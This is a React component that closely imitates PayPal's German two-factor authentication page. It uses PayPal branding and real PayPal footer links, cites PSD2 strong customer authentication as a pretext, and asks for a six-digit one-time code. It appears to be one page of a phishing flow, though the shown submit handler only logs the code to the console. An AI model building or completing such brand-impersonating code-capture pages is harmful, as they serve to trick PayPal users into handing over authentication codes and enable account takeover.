import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

export const Link3Page = (): JSX.Element => {
  const [otpValue, setOtpValue] = useState("");
  const [rememberDevice, setRememberDevice] = useState(true);

  const handleOtpChange = (value: string) => {
    // Only allow digits
    const digitsOnly = value.replace(/\D/g, '');
    setOtpValue(digitsOnly);
  };

  // Footer links data
  const footerLinks = [
    {
      text: "Kontakt",
      href: "https://www.paypal.com/de/smarthelp/contact-us",
    },
    {
      text: "Datenschutz",
      href: "https://www.paypal.com/de/webapps/mpp/ua/privacy-full",
    },
    {
      text: "AGB",
      href: "https://www.paypal.com/de/webapps/mpp/ua/legalhub-full",
    },
    {
      text: "Weltweit",
      href: "https://www.paypal.com/de/webapps/mpp/country-worldwide",
    },
  ];

  const handleSubmit = () => {
    if (otpValue.length === 6) {
      // Handle OTP submission
      console.log("OTP submitted:", otpValue);
      console.log("Remember device:", rememberDevice);
    }
  };

  return (
    <div className="flex flex-col w-full min-h-screen items-start relative bg-wwwpaypalcomwhite">
      {/* Main content */}
      <div className="flex flex-col w-full items-center justify-center flex-1 pt-[80px] sm:pt-[135px] px-4 sm:px-0">
        <Card className="w-full max-w-[400px] bg-wwwpaypalcomwhite border-none shadow-none">
          <CardHeader className="flex items-center justify-center pb-6 pt-0">
            <div className="w-16 h-16">
              <img
                className="w-16 h-16"
                alt="PayPal Logo"
                src="/figmaAssets/paypallogo.svg"
              />
            </div>
          </CardHeader>

          <CardContent className="px-0">
            <div className="text-center mb-6">
              <h3 className="font-www-paypal-com-semantic-heading-3 text-wwwpaypalcomblack text-[length:var(--www-paypal-com-semantic-heading-3-font-size)] tracking-[var(--www-paypal-com-semantic-heading-3-letter-spacing)] leading-[var(--www-paypal-com-semantic-heading-3-line-height)]">
                Authentifizierung erforderlich
              </h3>
              <p className="text-center text-sm text-[#696969] mt-2 px-4">
                Im Rahmen der überarbeiteten Zahlungsdiensterichtlinie (PSD2) "Starke Kundenauthentifizierung" benötigen wir weitere Informationen, die bestätigen, dass es sich wirklich um Sie handelt.
              </p>
            </div>

            {/* OTP Input */}
            <div className="flex justify-center mb-6 px-4 sm:px-9">
              <InputOTP
                maxLength={6}
                value={otpValue}
                onChange={handleOtpChange}
              >
                <InputOTPGroup className="flex gap-1 sm:gap-2">
                  <InputOTPSlot index={0} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={1} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={2} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={3} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={4} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                  <InputOTPSlot index={5} className="w-10 h-12 sm:w-12 sm:h-16 rounded-md border border-solid border-[#cccccc] bg-wwwpaypalcomwhite text-lg font-medium text-center focus:border-blue-500 focus:outline-none transition-colors duration-200" />
                </InputOTPGroup>
              </InputOTP>
            </div>

            {/* Remember device checkbox */}
            <div className="flex items-start gap-2 px-4 sm:px-10 mb-1">
              <Checkbox
                id="remember-device"
                checked={rememberDevice}
                onCheckedChange={(checked) => setRememberDevice(checked === true)}
                className="w-5 h-5 mt-0.5 rounded-sm border border-solid border-gray-400 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=checked]:text-white"
              />
              <div className="flex flex-col">
                <label
                  htmlFor="remember-device"
                  className="[font-family:'Helvetica_Neue-Regular',Helvetica] font-normal text-wwwpaypalcomblack tracking-[-0.28px] cursor-pointer text-[16px]"
                >
                  Dieses Gerät merken
                </label>
                <p className="font-www-paypal-com-semantic-label text-[#696969] tracking-[var(--www-paypal-com-semantic-label-letter-spacing)] text-left text-[14px]">
                  Überspringe diesen Schritt beim nächsten Mal, da wir dein Gerät als einen von zwei Authentifizierungsfaktoren verwenden, um zu bestätigen, dass du es bist. Merke keine gemeinsam genutzten Geräte. Du kannst das in deinen Sicherheitseinstellungen ändern.
                </p>
              </div>
            </div>

            {/* Submit button */}
            <div className="flex justify-center mt-6 px-4 sm:px-3">
              <Button 
                onClick={handleSubmit}
                disabled={otpValue.length !== 6}
                className="w-full max-w-[375px] h-[50px] bg-[#0c8ce9] text-wwwpaypalcomwhite rounded-[1000px] border-2 border-solid text-[length:var(--www-paypal-com-button-font-size)] tracking-[var(--www-paypal-com-button-letter-spacing)] leading-[var(--www-paypal-com-button-line-height)] hover:bg-[#0a7bd8] transition-colors duration-200 disabled:!bg-[#0551b5] disabled:text-white disabled:cursor-not-allowed disabled:!border-[#0551b5] disabled:opacity-100"
                style={{ 
                  fontFamily: 'var(--www-paypal-com-button-font-family)',
                  fontWeight: 'var(--www-paypal-com-button-font-weight)'
                }}
              >
                Weiter
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
      {/* Footer */}
      <div className="w-full min-h-[42px] bg-wwwpaypalcomalabaster flex flex-wrap items-center justify-center mt-auto py-2 px-4">
        {footerLinks.map((link, index) => (
          <a
            key={index}
            className="px-[6.4px] py-[8px] sm:py-[15px] font-www-paypal-com-semantic-link-underline text-wwwpaypalcomabbey text-[length:var(--www-paypal-com-semantic-link-underline-font-size)] tracking-[var(--www-paypal-com-semantic-link-underline-letter-spacing)] leading-[var(--www-paypal-com-semantic-link-underline-line-height)] underline text-xs sm:text-sm hover:text-blue-600 transition-colors duration-200"
            href={link.href}
            rel="noopener noreferrer"
            target="_blank"
          >
            {link.text}
          </a>
        ))}
      </div>
    </div>
  );
};